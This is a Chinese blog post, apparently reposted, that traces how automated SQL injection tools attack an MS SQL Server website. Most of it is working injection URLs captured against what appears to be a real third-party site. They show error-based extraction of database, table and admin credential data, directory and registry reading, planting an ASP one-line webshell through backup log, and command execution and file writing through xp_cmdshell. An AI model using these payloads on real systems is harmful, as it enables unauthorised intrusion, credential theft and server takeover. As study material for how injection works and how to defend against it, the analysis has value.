### SQL inject MS SQL Server {#sql-inject-ms-sql-server}

[http://www.webjx.com/database/sqlserver-18067.htm](http://www.webjx.com/database/sqlserver-18067.htm)

全面了解SQLServer注入过程

WebjxCom提示：这次用到的嗅探工具是sniffx专门嗅探http的数据包，功能不强大，但是足够这次活动的使用。

想了解sql注入的过程和原理，网上找了些文章，讲得都比较肤浅，但是我知道有几款国内比较常用的注入工具，比如Domain3.5、 NBSI3.0、啊D2.32、还有Pangolin、还有一些国外的。这里随便弄几个来研究一下就ok。这次用到的嗅探工具是sniffx专门嗅探 http的数据包，功能不强大，但是足够这次活动的使用。本来想使用ethereal或wireshark，但是里面复制数据包内容老是把没有转码的16 进制也复制了过来，有点麻烦。也就是说这两个工具用得不娴熟。

【查询数据库信息】

本地没有找到好点的有注入漏洞的系统，只好在网上寻找了，先用Domain3.5，运行很好以来就找到个sqlserver，sa权限的注入点，点Domain3.5上面的&quot;开始检测&quot;

以下是Domain3.5中嗅探出来的http数据包：

news_show.asp?id=15618%20and%201=1

news_show.asp?id=15618%20and%201=2

news_show.asp?id=15618%20and%20exists%20(select%20*%20from%20sysobjects)

news_show.asp?id=15618%20and%20char(124)%2Buser%2Bchar(124)=0

news_show.asp?id=15618;declare%20@a%20int-

news_show.asp?id=15618%20and%20char(124)%2Bdb_name()%2Bchar(124)=0

news_show.asp?id=15618%20And%20IS_SRVROLEMEMBER(0×730079007300610064006D0069006E00)=1

以下是NBSI3.0中嗅探出来的http数据包：

news_show.asp?id=15618%20and%20user%2Bchar(124)=0

news_show.asp?id=15618%20And%20system_user%2Bchar(124)=0

news_show.asp?id=15618%20And%20Cast(IS_SRVROLEMEMBER(0×730079007300610064006D0069006E00)%20as%20nvarchar(1))%2Bchar(124)=1

news_show.asp?id=15618%20And%20db_name()%2Bchar(124)=0

news_show.asp?id=15618;declare%20@a%20int-

啊D和Pangolin的数据包这里就不列出来了，都差不多。基本的过程是通过and 1=1和and 1=2来判断是否可注入，一般1=1返回http 200(ok),1=2返回http 500(internal server error)表示injectable。然后and exists(select * from sysobjects)来判断数据库类型，sysobjects是sqlserver每个数据库自带的用来存储数据库信息的表格，access每个数据库自带的表格是msysobjects。判断出来是sqlserver数据库之后，然后用系统自带的变量user,system_user和0比较，system_user是nchar类型，user是char类型，0是肯定是int类型，因为不同类型的数据在sqlserver中无法直接比较，所以对于开启错误提示的sqlserver来说就会报错，顺便将敏感信息也暴了出来：

关于user，system_user的解释，点上面的链接到msdn上去看看。

Cast(IS_SRVROLEMEMBER(0×730079007300610064006D0069006E00)%20as%20nvarchar(1))%2Bchar(124)=1中cast()作用是将一种数据类型的表达式显式转换为另一种数据类型的表达式。CAST 和 CONVERT 提供相似的功能。IS_SRVROLEMEMBER指示 SQL Server 2005 登录名是否为指定固定服务器角色的成员，返回值类型为int，0表示不是某某成员，1表示是。 0×730079007300610064006D0069006E00是&amp;apos;sysadmin&amp;apos;的16进制码,为啥要弄成16进制呢，我猜想可能是怕网站程序过滤点sysadmin关键字,如果页面正常返回(200),则表示该用户是sysadmin。精心将int转换成nvarchar(1)又会暴出类型转换错误，而这就是黑客所需要的信息。db_name()回暴出当前数据库名。

;declare%20@a%20int-申明一个int变量a，作用我不得而知。

接下来的工作是列出服务器上的数据库名：(假设服务器上有16个数据库)

news_show.asp?id=15618 And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From master..sysdatabases)%3E0

news_show.asp?id=15618 And char(124)+(Select Top 1 cast([name] as varchar(8000)) from(Select Top 1 dbid,name from [master]..[sysdatabases] order by [dbid]) T order by [dbid] desc)&gt;0

news_show.asp?id=15618 And char(124)+(Select Top 1 cast([name] as varchar(8000)) from(Select Top 2 dbid,name from [master]..[sysdatabases] order by [dbid]) T order by [dbid] desc)&gt;0

news_show.asp?id=15618 And (Select Top 1 cast([name] as nvarchar(4000))%2Bchar(124) from(Select Top 16 dbid,name from [master].[dbo].[sysdatabases] order by [dbid]) T order by [dbid] desc)&gt;0

先列出上面UrlEncode的字符

%2B - &amp;apos;+&amp;apos;

%3E - &amp;apos;&gt;&amp;apos;

%20 - &amp;apos; &amp;apos;

%2F - &amp;apos;/&amp;apos;

我只能说这些sql语句构造得是相当的巧妙啊，我开始纳闷了，为啥非要用子查询呢。于是我直接用

Select Top X dbid,name from [master].[dbo].[sysdatabases] order by [dbid]

当X为1,也就是返回第一个的时候，是没有问题的，返回了master,但是X为2的时候就出现错误：

&quot;子查询返回的值多于一个。当子查询跟随在 =、!=、&lt;、&lt;=、&gt;、&gt;= 之后，或子查询用作表达式时，这种情况是不允许的。&quot;

这个时候子查询就起到了关键作用。还有开始不知道T是啥玩意，后来才知道sqlserver子查询必须要起一个别名,T就是那个别名，然后把查询的语句继续和0比较报错 这样就暴出了所有的数据库名。

第一个select count(1)返回数据库数量。

接下来是猜解表名，假设我们当前的数据库是news，那么首先猜解数据库的表的数量：

news_show.asp?id=15618 And (Select char(124)+Cast(Count(1) as varchar(8000))+char(124) From news..sysobjects where xtype=0×55)&gt;0

xtype的为数据表类型，0×55就是U,就是用户表。其他的参见这里有详细的解释。

然后分别列出表名：

news_show.asp?id=15618 And (Select Top 1 cast(name as nvarchar(4000)) from (Select Top 1 id,name from [news]..[sysobjects] Where xtype=0×55 order by id) T order by id desc)&gt;0

修改第二个Top 1为1到表数就可以了。

然后是猜解列名，假设要猜解的表为Admin，首先得到表在sysobjects中存储的唯一id：

news_show.asp?id=15618 And (Select Top 1 cast(id as nvarchar(20)) from [news].[dbo].[sysobjects] where name=&amp;apos;Admin&amp;apos;)&gt;0

猜解表名，id就是上面查询出来Admin表的id。

news_show.asp?id=15618 And (Select Top 1 cast(name as nvarchar(4000))+char(124) from (Select Top 1 colid,name From [news].[dbo].[syscolumns] Where id = 1993058136 Order by colid) T Order by colid desc)&gt;0

假设猜解出来的列名有id,AdminName,AdminPassword,AdminPower,Userid,ct

假设只猜解AdminName和AdminPassword的值

首先查看Admin表有多少条记录：

news_show.asp?id=15618 And (Select Cast(Count([AdminName]) as nvarchar(4000))+char(124) From [news]..[Admin] Where 1=1)&gt;0

返回第一列数据：

news_show.asp?id=15618 And (Select Top 1 isNull(cast([AdminName] as nvarchar(4000)),char(32)) char(124) isNull(cast([AdminPassword] as nvarchar(4000)),char(32)) From (Select Top 1 [AdminName],[AdminPassword] From [news]..[Admin] Where 1=1 Order by [AdminName]) T Order by [AdminName] Desc)&gt;0

isNull是判定数据是否为空，为空就返回后面那个char(32)的值也就是空格-&gt;&amp;apos; &amp;apos; 。

后面的以此类推。

【读取目录--xp_dirtree】

drop掉表，然后在当前数据库创建一个表，有三个字段subdirectory,depth,file

Board.asp?id=494;DROP TABLE techguru;CREATE TABLE techguru(subdirectory nvarchar(400) NULL,depth tinyint NULL,[file] bit NULL)-

清空表的数据，然后把xp_dirtree存储过程的结果存入techguru表,xp_dirtree第一个参数是路径，第二个是深度，为0时无限递归，第三个是文件类型，1为文件夹和文件，0为只显示文件夹。

Board.asp?id=494;DELETE techguru;Insert techguru exec master..xp_dirtree &amp;apos;c:\&amp;apos;,1,1-

开始一个一个的抓取文件，目录名字，每次增加第二个top后面的数

Board.asp?id=494 And (Select Top 1 cast([subdirectory] as nvarchar(400))%2Bchar(124)%2Bcast([file] as nvarchar(1))%2Bchar(124) From(Select Top 1 [subdirectory],[file] From techguru ORDER BY [file],[subdirectory]) T ORDER BY [file] desc,[subdirectory] desc)=0

移除表：

Board.asp?id=494;DROP TABLE techguru-

【读取注册表--xp_regread】

首先建立一个表，有两列Value和Data

Board.asp?id=494;DROP TABLE [techguru];CREATE TABLE [techguru](Value nvarchar(4000) NULL,Data nvarchar(4000) NULL)-

执行xp_regread写入刚建立的表

Board.asp?id=494;DELETE [techguru];Insert [techguru] exec master.dbo.xp_regread &amp;apos;HKEY_LOCAL_MACHINE&amp;apos;,&amp;apos;SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots&amp;apos;,&amp;apos;/&amp;apos;-

读出来

Board.asp?id=494 And (Select Top 1 cast([Data] as nvarchar(4000))%2Bchar(124) From [techguru] order by [Data] desc)=0

删表

Board.asp?id=494;DROP TABLE [techguru]-

【上传webshell--backup log xx to disk】

备份log,截断1，截断2

第 一 步:建立存一句话木马的表

Board.asp?id=494;create table [dbo].[shit_tmp] ([cmd] [image])-

第 二 步：0×7900690061006F006C007500是&amp;apos;yiaolu&amp;apos;的sql编码

Board.asp?id=494;declare @a sysname,@s nvarchar(4000) select @a=db_name

(),@s=0×7900690061006F006C007500 backup log @a to disk = @s with init,no_truncate-

第 三 步：0×3C25657865637574652872657175657374282261222929253E是&lt;%execute(request(&quot;a&quot;))%&gt;的hex。

Board.asp?id=494;insert into [shit_tmp](cmd) values

(0×3C25657865637574652872657175657374282261222929253E)-

第 四 步0×64003A005C003100320033002E00610073007000是d:\123.asp的sql编码

Board.asp?id=494;declare @a sysname,@s nvarchar(4000) select @a=db_name

(),@s=0×64003A005C003100320033002E00610073007000 backup log @a to disk=@s with init,no_truncate-

第 五 步

Board.asp?id=494;Drop table [shit_tmp]-

【执行命令】

;CREATE TABLE [X_2894]([id] int NOT NULL IDENTITY (1,1), [ResultTxt] nvarchar(4000) NULL);

insert into [X_2894](ResultTxt) exec master.dbo.xp_cmdshell &amp;apos;Dir C:\&amp;apos;;

insert into [X_2894] values (&amp;apos;g_over&amp;apos;);exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

And (Select Top 1 CASE WHEN ResultTxt is Null then char(124) else ResultTxt+char(124) End from (Select Top 1 id,ResultTxt from [X_2894] order by [id]) T order by [id] desc)&gt;0

……

And (Select Top 1 CASE WHEN ResultTxt is Null then char(124) else ResultTxt+char(124) End from (Select Top 23 id,ResultTxt from [X_2894] order by [id]) T order by [id] desc)&gt;0

g_over这个是专门插入用来作为命令回显结束的标志。

;DROP TABLE [X_2894];-

【本地文件上传】

假设上传到服务器c:\down.vbs位置

;exec master.dbo.xp_cmdshell &amp;apos;del C:\down.vbs&amp;apos;-

;exec master.dbo.xp_cmdshell &amp;apos;ecHo [DeleteOnCopy] &gt;&gt; C:\down.vbs&amp;apos;;exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

;exec master.dbo.xp_cmdshell &amp;apos;ecHo Owner=Administrator &gt;&gt; C:\down.vbs&amp;apos;;exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

;exec master.dbo.xp_cmdshell &amp;apos;ecHo Personalized=5 &gt;&gt; C:\down.vbs&amp;apos;;exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

;exec master.dbo.xp_cmdshell &amp;apos;ecHo PersonalizedName=My Documents &gt;&gt; C:\down.vbs&amp;apos;;exec master.dbo.sp_dropextendedproc &amp;apos;xp_cmdshell&amp;apos;-

;use master dbcc addextendedproc(&amp;apos;xp_cmdshell&amp;apos;,&amp;apos;xplog70.dll&amp;apos;)-

总结来说就是调用xp_cmdshell执行echo 一句句的写入文件。

这次分析算是告一段落，不过还有mysql,access,oracle,db2,infomix……….等待探索。